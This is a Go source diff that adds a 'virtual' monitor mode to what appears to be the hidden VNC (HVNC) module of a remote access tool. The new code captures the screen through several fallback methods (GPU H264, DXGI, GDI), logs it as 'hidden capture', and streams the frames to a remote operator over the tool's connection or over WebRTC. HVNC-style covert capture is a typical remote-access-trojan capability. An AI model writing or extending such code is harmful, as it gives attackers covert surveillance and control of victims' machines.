@@ -1608,6 +1608,175 @@ func NowHVNC(ctx context.Context, env *rt.Env) error {
 	return captureAndSendHVNC(ctx, env)
 }
 
+func NowVirtual(ctx context.Context, env *rt.Env) error {
+	if env.Cfg.DisableCapture {
+		return sendBlackFrameVirtual(ctx, env)
+	}
+	if VirtualMonitorCount() <= 0 {
+		return nil
+	}
+	return captureAndSendVirtual(ctx, env)
+}
+
+func captureAndSendVirtual(ctx context.Context, env *rt.Env) error {
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("hidden capture: panic in captureAndSendVirtual: %v", r)
+		}
+	}()
+
+	t0 := time.Now()
+	if frame, captureDur, encodeDur, used, err := VirtualTryDirectH264Frame(); used {
+		if err == nil {
+			if len(frame.Data) == 0 {
+				return nil
+			}
+			return virtualSendCompletedFrame(ctx, env, frame, t0, captureDur, encodeDur)
+		}
+		log.Printf("hidden capture: direct GPU path unavailable: %v", err)
+	}
+
+	// Virtual mode is normal remote desktop restricted to one monitor. Start
+	// with that exact capture stack; specialized paths are fallbacks only.
+	img, err := VirtualCaptureNormal()
+	if err != nil {
+		img, err = VirtualCaptureDisplay()
+		if err != nil {
+			VirtualResetDXGI()
+			img, err = VirtualCaptureGDI()
+			if err != nil {
+				img, err = VirtualCaptureDisplayFallback()
+			}
+		}
+	}
+	if err != nil {
+		log.Printf("hidden capture: all capture methods failed: %v (sending black frame)", err)
+		return sendBlackFrameVirtual(ctx, env)
+	}
+	if img == nil {
+		log.Printf("hidden capture: capture returned nil image (sending black frame)")
+		return sendBlackFrameVirtual(ctx, env)
+	}
+	captureDur := time.Since(t0)
+
+	willSendViaWebRTC := blockCodec() == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC)
+	var slotAcquired bool
+	if !willSendViaWebRTC && !AcquireFrameSlot() {
+		PutRGBA(img)
+		return nil
+	}
+	slotAcquired = !willSendViaWebRTC
+
+	quality := jpegQuality()
+	frame, encodeDur, err := buildFrameHVNC(img, 0, quality)
+	PutRGBA(img)
+	img = nil
+	if err != nil {
+		if slotAcquired {
+			ReleaseFrameSlot()
+		}
+		return err
+	}
+
+	now := time.Now()
+	fps := frameFPS(now)
+	if fps <= 0 {
+		fps = 1
+	}
+	frame.Header.FPS = fps
+
+	if ctx.Err() != nil {
+		if slotAcquired {
+			ReleaseFrameSlot()
+		}
+		return nil
+	}
+	if frame.Header.Format == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC) {
+		dur := time.Second / time.Duration(fps)
+		if dur <= 0 {
+			dur = 33 * time.Millisecond
+		}
+		if werr := webrtcpub.WriteH264(webrtcpub.KindHVNC, frame.Data, dur); werr != nil {
+			log.Printf("webrtc: write hidden h264 failed: %v", werr)
+		}
+		if slotAcquired {
+			ReleaseFrameSlot()
+		}
+		return nil
+	}
+	if !slotAcquired {
+		if !AcquireFrameSlot() {
+			return nil
+		}
+		slotAcquired = true
+	}
+
+	sendStart := time.Now()
+	err = wire.WriteMsg(ctx, env.Conn, frame)
+	sendDur := time.Since(sendStart)
+	if err != nil {
+		ReleaseFrameSlot()
+	}
+
+	if shouldLogFrame(now) {
+		total := time.Since(t0)
+		log.Printf("hidden capture: stream format=%s size=%d cap=%s enc=%s send=%s total=%s",
+			frame.Header.Format, len(frame.Data), captureDur, encodeDur, sendDur, total)
+	}
+
+	return err
+}
+
+func virtualSendCompletedFrame(ctx context.Context, env *rt.Env, frame wire.Frame, t0 time.Time, captureDur, encodeDur time.Duration) error {
+	now := time.Now()
+	fps := frameFPS(now)
+	if fps <= 0 {
+		fps = 1
+	}
+	frame.Header.FPS = fps
+	if ctx.Err() != nil {
+		return nil
+	}
+	if frame.Header.Format == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC) {
+		dur := time.Second / time.Duration(fps)
+		if dur <= 0 {
+			dur = 33 * time.Millisecond
+		}
+		if werr := webrtcpub.WriteH264(webrtcpub.KindHVNC, frame.Data, dur); werr != nil {
+			log.Printf("webrtc: write hidden h264 failed: %v", werr)
+		}
+		return nil
+	}
+	if !AcquireFrameSlot() {
+		return nil
+	}
+	sendStart := time.Now()
+	err := wire.WriteMsg(ctx, env.Conn, frame)
+	sendDur := time.Since(sendStart)
+	ReleaseFrameSlot()
+	if shouldLogFrame(now) {
+		total := time.Since(t0)
+		log.Printf("hidden capture: direct h264 format=%s size=%d cap=%s enc=%s send=%s total=%s",
+			frame.Header.Format, len(frame.Data), captureDur, encodeDur, sendDur, total)
+	}
+	return err
+}
+
+func sendBlackFrameVirtual(ctx context.Context, env *rt.Env) error {
+	if ctx.Err() != nil {
+		return nil
+	}
+
+	img := image.NewRGBA(image.Rect(0, 0, 64, 64))
+	quality := 60
+	frame, _, err := buildFrameHVNC(img, 0, quality)
+	if err != nil {
+		return err
+	}
+	frame.Header.FPS = 1
+	return wire.WriteMsg(ctx, env.Conn, frame)
+}
+
 func supportsBackstageCapture() bool {
 	count := HVNCMonitorCount()
 	return count > 0
